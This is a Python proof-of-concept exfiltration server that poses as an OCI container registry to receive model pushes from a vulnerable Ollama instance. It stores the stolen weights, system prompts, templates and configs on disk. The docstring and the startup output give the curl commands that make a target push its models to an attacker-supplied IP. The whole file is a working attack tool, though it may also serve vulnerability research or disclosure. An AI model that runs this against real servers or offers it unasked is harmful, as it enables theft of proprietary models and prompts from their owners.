#!/usr/bin/env python3
"""
poc_exfil_server.py — Ollama Model Exfiltration Receiver

Implements a minimal OCI Distribution Registry that accepts model pushes
from a vulnerable Ollama instance. Saves all blobs (weights, prompts,
templates, config) to disk and prints a summary of exfiltrated data.

Protocol (OCI Distribution Spec subset):
  HEAD /v2/{repo}/blobs/{digest}          -> 404 (triggers upload flow)
  POST /v2/{repo}/blobs/uploads/          -> 202, Location: .../uploads/{uuid}
  PATCH /v2/{repo}/blobs/uploads/{uuid}   -> 202, Location: ..., Range: 0-{n}
  PUT   /v2/{repo}/blobs/uploads/{uuid}   -> 201
  PUT   /v2/{repo}/manifests/{tag}        -> 201

Usage:
    python3 poc_exfil_server.py                        # default: 0.0.0.0:8080
    python3 poc_exfil_server.py --port 9090
    python3 poc_exfil_server.py --host 0.0.0.0 --port 8080 --output ./stolen_models

Then trigger exfiltration from the target:
    curl -X POST http://target:11434/api/copy \\
      -d '{"source":"smollm2:135m","destination":"YOUR_IP:8080/stolen/smollm2:latest"}'

    curl -X POST http://target:11434/api/push \\
      -d '{"model":"YOUR_IP:8080/stolen/smollm2:latest","insecure":true}'
"""

import argparse
import hashlib
import json
import os
import sys
import uuid
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs


class ExfilHandler(BaseHTTPRequestHandler):
    """HTTP handler implementing the OCI push protocol."""

    blobs = {}
    uploads = {}
    manifests = {}

    def log_message(self, fmt, *args):
        sys.stderr.write(f"[exfil] {fmt % args}\n")

    def _path_parts(self):
        path = self.path.split("?")[0]
        return path.strip("/").split("/")

    def _blob_path(self):
        parts = self._path_parts()
        if len(parts) >= 4 and parts[0] == "v2" and parts[-2] == "blobs":
            return "/".join(parts[1:-2]), parts[-1]
        return None, None

    def _upload_path(self):
        parts = self._path_parts()
        if len(parts) >= 5 and parts[0] == "v2" and parts[-3] == "blobs" and parts[-2] == "uploads":
            return "/".join(parts[1:-3]), parts[-1]
        return None, None

    def _upload_start_path(self):
        parts = self._path_parts()
        if len(parts) >= 4 and parts[0] == "v2" and parts[-2] == "blobs" and parts[-1] == "uploads":
            return "/".join(parts[1:-2])
        return None

    def _manifest_path(self):
        parts = self._path_parts()
        if len(parts) >= 4 and parts[0] == "v2" and parts[-2] == "manifests":
            return "/".join(parts[1:-2]), parts[-1]
        return None, None

    def do_HEAD(self):
        repo, digest = self._blob_path()
        if repo and digest:
            if digest in self.blobs:
                self.send_response(200)
                self.send_header("Content-Length", str(len(self.blobs[digest])))
                self.send_header("Docker-Content-Digest", digest)
                self.end_headers()
            else:
                self.send_response(404)
                self.end_headers()
        else:
            self._json(404, {"errors": [{"code": "BLOB_UNKNOWN"}]})

    def do_POST(self):
        repo = self._upload_start_path()
        if repo:
            upload_uuid = str(uuid.uuid4())
            self.uploads[upload_uuid] = bytearray()
            host = self.headers.get("Host", "localhost")
            location = f"http://{host}/v2/{repo}/blobs/uploads/{upload_uuid}"
            self.send_response(202)
            self.send_header("Location", location)
            self.send_header("Range", "0-0")
            self.send_header("Content-Length", "0")
            self.end_headers()
            self.log_message(f"upload started: {upload_uuid} (repo={repo})")
        else:
            self._json(400, {"errors": [{"code": "NAME_INVALID"}]})

    def do_PATCH(self):
        repo, upload_uuid = self._upload_path()
        if repo and upload_uuid:
            if upload_uuid not in self.uploads:
                self._json(404, {"errors": [{"code": "BLOB_UPLOAD_UNKNOWN"}]})
                return
            cl = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(cl) if cl else b""
            self.uploads[upload_uuid].extend(data)
            sz = len(self.uploads[upload_uuid])
            host = self.headers.get("Host", "localhost")
            location = f"http://{host}/v2/{repo}/blobs/uploads/{upload_uuid}"
            self.send_response(202)
            self.send_header("Location", location)
            self.send_header("Range", f"0-{sz - 1}")
            self.send_header("Content-Length", "0")
            self.end_headers()
            self.log_message(f"upload chunk: {upload_uuid} ({sz} bytes)")
        else:
            self._json(404, {"errors": [{"code": "BLOB_UPLOAD_UNKNOWN"}]})

    def do_PUT(self):
        repo, upload_uuid = self._upload_path()
        if repo and upload_uuid:
            self._finalize_blob_upload(repo, upload_uuid)
            return
        repo, tag = self._manifest_path()
        if repo and tag:
            self._store_manifest(repo, tag)
            return
        self._json(404, {"errors": [{"code": "UNKNOWN"}]})

    def _finalize_blob_upload(self, repo, upload_uuid):
        if upload_uuid not in self.uploads:
            self._json(404, {"errors": [{"code": "BLOB_UPLOAD_UNKNOWN"}]})
            return
        data = bytes(self.uploads.pop(upload_uuid))
        digest = "sha256:" + hashlib.sha256(data).hexdigest()
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        if "digest" in params and params["digest"][0] != digest:
            self._json(400, {"errors": [{"code": "DIGEST_INVALID"}]})
            return
        self.blobs[digest] = data
        self.log_message(f"blob stored: {digest} ({len(data)} bytes)")
        host = self.headers.get("Host", "localhost")
        self.send_response(201)
        self.send_header("Location", f"http://{host}/v2/{repo}/blobs/{digest}")
        self.send_header("Docker-Content-Digest", digest)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def _store_manifest(self, repo, tag):
        cl = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(cl) if cl else b""
        try:
            manifest = json.loads(data)
        except json.JSONDecodeError:
            self._json(400, {"errors": [{"code": "MANIFEST_INVALID"}]})
            return
        self.manifests[tag] = manifest
        self.log_message(f"manifest stored: {tag}")
        if "config" in manifest:
            self.log_message(f"  config: {manifest['config'].get('digest', '?')} ({manifest['config'].get('size', '?')} bytes)")
        for layer in manifest.get("layers", []):
            self.log_message(f"  layer: {layer.get('digest', '?')} ({layer.get('size', '?')} bytes)")
        digest = "sha256:" + hashlib.sha256(data).hexdigest()
        host = self.headers.get("Host", "localhost")
        self.send_response(201)
        self.send_header("Location", f"http://{host}/v2/{repo}/manifests/{tag}")
        self.send_header("Docker-Content-Digest", digest)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_GET(self):
        if self.path in ("/", ""):
            self._json(200, {
                "status": "ok",
                "blobs_received": len(self.blobs),
                "manifests_received": len(self.manifests),
                "blobs": {d[:19] + "...": len(v) for d, v in self.blobs.items()},
                "manifests": list(self.manifests.keys()),
            })
        else:
            self._json(404, {"errors": [{"code": "UNKNOWN"}]})

    def _json(self, code, body=None, extra_headers=None):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        if extra_headers:
            for k, v in extra_headers.items():
                self.send_header(k, v)
        self.end_headers()
        if body is not None:
            self.wfile.write(json.dumps(body).encode())


def save_exfiltrated(output_dir, blobs, manifests):
    os.makedirs(output_dir, exist_ok=True)
    saved = []
    for tag, manifest in manifests.items():
        safe = tag.replace("/", "_").replace(":", "_")
        p = os.path.join(output_dir, f"manifest_{safe}.json")
        with open(p, "w") as f:
            json.dump(manifest, f, indent=2)
        saved.append(("manifest", p, len(json.dumps(manifest))))
    for digest, data in blobs.items():
        short = digest.replace("sha256:", "")[:12]
        hint = "blob"
        try:
            text = data.decode("utf-8", errors="strict")
            parsed = json.loads(text)
            if isinstance(parsed, dict):
                if "model_type" in parsed or "architectures" in parsed:
                    hint = "config"
                elif "stop" in parsed or "temperature" in parsed:
                    hint = "parameters"
                else:
                    hint = "json"
        except (UnicodeDecodeError, json.JSONDecodeError):
            if data[:4] == b"GGUF":
                hint = "model_weights"
            elif len(data) < 200:
                try:
                    t = data.decode("utf-8")
                    hint = "template" if ("<" in t and ">" in t) else "system_prompt"
                except UnicodeDecodeError:
                    pass
        ext = ".gguf" if hint == "model_weights" else ".json" if hint in ("config", "parameters", "json") else ".jinja2" if hint == "template" else ".txt" if hint == "system_prompt" else ""
        fn = f"{hint}_{short}{ext}"
        fp = os.path.join(output_dir, fn)
        with open(fp, "wb") as f:
            f.write(data)
        saved.append((hint, fp, len(data)))
    return saved


def main():
    parser = argparse.ArgumentParser(description="Ollama Model Exfiltration Receiver", formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument("--output", "-o", default="./stolen_models")
    args = parser.parse_args()

    server = HTTPServer((args.host, args.port), ExfilHandler)
    print(f"[*] Exfiltration receiver listening on {args.host}:{args.port}")
    print(f"[*] Output directory: {args.output}")
    print(f"\n[*] Trigger exfiltration:")
    print(f'    curl -X POST http://target:11434/api/copy -d \'{{"source":"smollm2:135m","destination":"YOUR_IP:{args.port}/stolen/smollm2:latest"}}\'')
    print(f'    curl -X POST http://target:11434/api/push -d \'{{"model":"YOUR_IP:{args.port}/stolen/smollm2:latest","insecure":true}}\'')
    print()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        server.shutdown()

    saved = save_exfiltrated(args.output, ExfilHandler.blobs, ExfilHandler.manifests)
    if saved:
        print(f"\n[+] Saved {len(saved)} files to {args.output}/:")
        total = 0
        for kind, path, size in saved:
            total += size
            s = f"{size} B" if size < 1024 else f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/1024/1024:.1f} MB"
            print(f"    {kind:20s} {s:>12s}  {os.path.basename(path)}")
        print(f"\n    Total: {total/1024/1024:.1f} MB")
    else:
        print("[-] No data received.")


if __name__ == "__main__":
    main()
